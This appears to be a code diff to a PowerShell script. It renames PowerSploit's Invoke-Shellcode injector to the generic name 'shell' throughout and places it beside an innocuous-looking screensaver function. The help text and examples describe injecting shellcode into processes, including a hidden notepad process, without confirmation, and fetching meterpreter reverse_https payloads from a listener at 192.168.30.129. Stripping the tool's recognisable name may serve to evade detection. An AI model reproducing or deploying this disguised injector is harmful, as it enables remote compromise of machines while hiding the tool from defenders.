@@ -22,14 +22,14 @@ function f
 {
 start $env:WINDIR/System32/scrnsave.scr /s
 }
-function Invoke-Shellcode
+function shell
 {
 <#
 .SYNOPSIS
 
 Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.
 
-PowerSploit Function: Invoke-Shellcode
+PowerSploit Function: shell
 Author: Matthew Graeber (@mattifestation)
 License: BSD 3-Clause
 Required Dependencies: None
@@ -55,7 +55,7 @@ Specifies an optional shellcode passed in as a byte array
 
 .PARAMETER ListMetasploitPayloads
 
-Lists all of the available Metasploit payloads that Invoke-Shellcode supports
+Lists all of the available Metasploit payloads that shell supports
 
 .PARAMETER Lhost
 
@@ -75,11 +75,11 @@ Optionally specifies the user agent to use when using meterpreter http or https 
 
 .PARAMETER Force
 
-Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.
+Injects shellcode without prompting for confirmation. By default, shell prompts for confirmation before performing any malicious act.
 
 .EXAMPLE
 
-C:\PS> Invoke-Shellcode -ProcessId 4274
+C:\PS> shell -ProcessId 4274
 
 Description
 -----------
@@ -87,7 +87,7 @@ Inject shellcode into process ID 4274.
 
 .EXAMPLE
 
-C:\PS> Invoke-Shellcode
+C:\PS> shell
 
 Description
 -----------
@@ -97,7 +97,7 @@ Inject shellcode into the running instance of PowerShell.
 
 C:\PS> Start-Process C:\Windows\SysWOW64\notepad.exe -WindowStyle Hidden
 C:\PS> $Proc = Get-Process notepad
-C:\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbose
+C:\PS> shell -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbose
 
 VERBOSE: Requesting meterpreter payload from https://192.168.30.129:443/INITM
 VERBOSE: Injecting shellcode into PID: 4004
@@ -122,7 +122,7 @@ LPORT     443              yes       The local listener port
 
 .EXAMPLE
 
-C:\PS> Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 80
+C:\PS> shell -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 80
 
 Description
 -----------
@@ -138,7 +138,7 @@ LPORT     80               yes       The local listener port
 
 .EXAMPLE
 
-C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
+C:\PS> shell -Shellcode @(0x90,0x90,0xC3)
     
 Description
 -----------
@@ -147,7 +147,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
     
 .EXAMPLE
 
-C:\PS> Invoke-Shellcode -ListMetasploitPayloads
+C:\PS> shell -ListMetasploitPayloads
     
 Payloads
 --------
@@ -214,7 +214,7 @@ http://www.exploit-monday.com
     # List all available Metasploit payloads and exit the function
     if ($PsCmdlet.ParameterSetName -eq 'ListPayloads')
     {
-        $AvailablePayloads = (Get-Command Invoke-Shellcode).Parameters['Payload'].Attributes |
+        $AvailablePayloads = (Get-Command shell).Parameters['Payload'].Attributes |
             Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
     
         foreach ($Payload in $AvailablePayloads.ValidValues)
